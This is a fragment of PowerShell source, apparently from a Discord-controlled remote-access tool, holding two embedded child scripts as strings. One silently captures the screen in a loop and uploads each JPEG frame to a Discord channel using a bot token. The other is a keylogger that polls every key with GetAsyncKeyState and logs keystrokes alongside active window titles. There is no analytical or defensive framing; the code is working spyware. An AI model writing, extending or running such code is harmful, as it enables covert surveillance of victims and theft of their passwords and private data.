# ==================== CHILD SCRIPTS ====================
$script:CaptureChildCode = (@(
    'param()',
    '$ErrorActionPreference = "SilentlyContinue"',
    '$errLog = $env:DAG_ERRLOG',
    'function Write-Err { param($msg) try { Add-Content -LiteralPath $errLog -Value ("[" + (Get-Date).ToString("HH:mm:ss") + "] " + $msg) -Encoding UTF8 } catch {} }',
    'Write-Err "child started"',
    'try {',
    '    Add-Type -AssemblyName System.Windows.Forms',
    '    Add-Type -AssemblyName System.Drawing',
    '} catch { Write-Err "Add-Type fail: $_"; exit 1 }',
    '$token     = $env:DAG_TOKEN',
    '$channelId = $env:DAG_CHANNEL',
    '$fps       = [int]$env:DAG_FPS',
    '$quality   = [int]$env:DAG_QUALITY',
    '$maxSec    = [int]$env:DAG_MAXSEC',
    '$monitor   = [int]$env:DAG_MONITOR',
    '$killFile  = $env:DAG_KILLFILE',
    '$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq "image/jpeg" }',
    '$ep = New-Object System.Drawing.Imaging.EncoderParameters(1)',
    '$ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]$quality)',
    '$headers = @{ Authorization = "Bot $token"; "User-Agent" = "DiscordBot (https://example.com, 1.0)" }',
    '$start = Get-Date',
    '$frame = 0',
    '$fail  = 0',
    'Write-Err ("config: fps=$fps q=$quality max=$maxSec mon=$monitor")',
    'while ($true) {',
    '    if (Test-Path -LiteralPath $killFile) { Write-Err "kill file detected"; break }',
    '    if ($maxSec -gt 0 -and ((Get-Date) - $start).TotalSeconds -gt $maxSec) { Write-Err "timeout"; break }',
    '    $path = $null',
    '    try {',
    '        if ($monitor -eq 0) {',
    '            $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen',
    '        } else {',
    '            $screens = [System.Windows.Forms.Screen]::AllScreens',
    '            if ($monitor -gt $screens.Count) { Write-Err "bad monitor $monitor"; break }',
    '            $bounds = $screens[$monitor - 1].Bounds',
    '        }',
    '        $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height',
    '        $g   = [System.Drawing.Graphics]::FromImage($bmp)',
    '        $g.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)',
    '        $g.Dispose()',
    '        $path = Join-Path $env:TEMP ("cap_" + [guid]::NewGuid().ToString("N").Substring(0,8) + ".jpg")',
    '        $bmp.Save($path, $codec, $ep)',
    '        $bmp.Dispose()',
    '        $frame++',
    '    } catch { Write-Err ("capture err: " + $_); Start-Sleep -Seconds 1; continue }',
    '    try {',
    '        $boundary = "----Cap" + [guid]::NewGuid().ToString("N")',
    '        $LF  = ([char]13).ToString() + ([char]10).ToString()',
    '        $enc = [System.Text.Encoding]::UTF8',
    '        $ms  = New-Object System.IO.MemoryStream',
    '        $payloadJson = ''{"content":"frame #'' + $frame + ''"}''',
    '        $head = "--$boundary$LF" +',
    '                "Content-Disposition: form-data; name=""payload_json""$LF" +',
    '                "Content-Type: application/json$LF$LF" +',
    '                "$payloadJson$LF" +',
    '                "--$boundary$LF" +',
    '                "Content-Disposition: form-data; name=""files[0]""; filename=""cap.jpg""$LF" +',
    '                "Content-Type: image/jpeg$LF$LF"',
    '        $hb = $enc.GetBytes($head)',
    '        $ms.Write($hb, 0, $hb.Length)',
    '        $fb = [System.IO.File]::ReadAllBytes($path)',
    '        $ms.Write($fb, 0, $fb.Length)',
    '        $eb = $enc.GetBytes("$LF--$boundary--$LF")',
    '        $ms.Write($eb, 0, $eb.Length)',
    '        $body = $ms.ToArray()',
    '        $ms.Close(); $ms.Dispose()',
    '        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary" -TimeoutSec 15 | Out-Null',
    '        $fail = 0',
    '    } catch {',
    '        $fail++',
    '        $code = $null; try { $code = [int]$_.Exception.Response.StatusCode } catch {}',
    '        Write-Err ("upload err #$fail code=$code : " + $_)',
    '        if ($code -eq 429) { Start-Sleep -Seconds 3 }',
    '        elseif ($fail -ge 5) { Write-Err "5 fails, giving up"; break }',
    '        else { Start-Sleep -Milliseconds 800 }',
    '    } finally {',
    '        if ($path) { Remove-Item -LiteralPath $path -Force -EA SilentlyContinue }',
    '    }',
    '    Start-Sleep -Milliseconds ([int](1000 / $fps))',
    '}',
    'Write-Err "child exiting"',
    'Get-ChildItem "$env:TEMP\cap_*.jpg" -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue'
) -join "`n")

$script:KeylogChildCode = (@(
    'param()',
    '$ErrorActionPreference = "SilentlyContinue"',
    '$killFile = $env:DAG_KILLFILE',
    '$logFile  = $env:DAG_LOGFILE',
    'Add-Type @"',
    'using System;',
    'using System.Runtime.InteropServices;',
    'public class KB {',
    '    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);',
    '    [DllImport("user32.dll")] public static extern int GetForegroundWindow();',
    '    [DllImport("user32.dll")] public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);',
    '}',
    '"@',
    'function Get-KeyName {',
    '    param([int]$vk)',
    '    $map = @{',
    '        8=''[BKSP]''; 9=''[TAB]''; 13="`n[ENTER]`n"; 16=''[SHIFT]''; 17=''[CTRL]''; 18=''[ALT]'';',
    '        19=''[PAUSE]''; 20=''[CAPS]''; 27=''[ESC]''; 32='' ''; 33=''[PGUP]''; 34=''[PGDN]'';',
    '        35=''[END]''; 36=''[HOME]''; 37=''[LEFT]''; 38=''[UP]''; 39=''[RIGHT]''; 40=''[DOWN]'';',
    '        45=''[INS]''; 46=''[DEL]''; 91=''[LWIN]''; 92=''[RWIN]''; 93=''[MENU]'';',
    '        186='';''; 187=''=''; 188='',''; 189=''-''; 190=''.''; 191=''/''; 192=''`'';',
    '        219=''[''; 220=''\''; 221='']''; 222="''";',
    '    }',
    '    if ($map.ContainsKey($vk)) { return $map[$vk] }',
    '    if ($vk -ge 48 -and $vk -le 57) { return [string][char]$vk }',
    '    if ($vk -ge 65 -and $vk -le 90) { return [string][char]$vk }',
    '    if ($vk -ge 96 -and $vk -le 105) { return "[NUM" + ($vk-96) + "]" }',
    '    if ($vk -ge 112 -and $vk -le 123) { return "[F" + ($vk-111) + "]" }',
    '    return ""',
    '}',
    '$prev = @{}',
    'for ($i = 0; $i -lt 256; $i++) { $prev[$i] = $false }',
    '$sb = New-Object System.Text.StringBuilder',
    '$lastFlush = Get-Date',
    '$currentWindow = ""',
    'while ($true) {',
    '    if (Test-Path -LiteralPath $killFile) { break }',
    '    try {',
    '        $hwnd = [KB]::GetForegroundWindow()',
    '        $titleBuf = New-Object System.Text.StringBuilder 256',
    '        [void][KB]::GetWindowText($hwnd, $titleBuf, 256)',
    '        $title = $titleBuf.ToString()',
    '        if ($title -and $title -ne $currentWindow) {',
    '            $currentWindow = $title',
    '            [void]$sb.Append("`n`n--- [" + (Get-Date).ToString("HH:mm:ss") + "] WINDOW: " + $title + " ---`n")',
    '        }',
    '    } catch { }',
    '    for ($vk = 8; $vk -le 254; $vk++) {',
    '        $state = [KB]::GetAsyncKeyState($vk)',
    '        $isDown = ($state -band 0x8000) -ne 0',
    '        if ($isDown -and -not $prev[$vk]) {',
    '            $name = Get-KeyName -vk $vk',
    '            if ($name) { [void]$sb.Append($name) }',
    '            if ($sb.Length -gt 2000 -or ((Get-Date) - $lastFlush).TotalSeconds -gt 5) {',
    '                try {',
    '                    Add-Content -LiteralPath $logFile -Value $sb.ToString() -Encoding UTF8 -EA Stop',
    '                    [void]$sb.Clear()',
    '                    $lastFlush = Get-Date',
    '                } catch { }',
    '            }',
    '        }',
    '        $prev[$vk] = $isDown',
    '    }',
    '    Start-Sleep -Milliseconds 15',
    '}',
    'if ($sb.Length -gt 0) {',
    '    try { Add-Content -LiteralPath $logFile -Value $sb.ToString() -Encoding UTF8 } catch { }',
    '}'
) -join "`n")

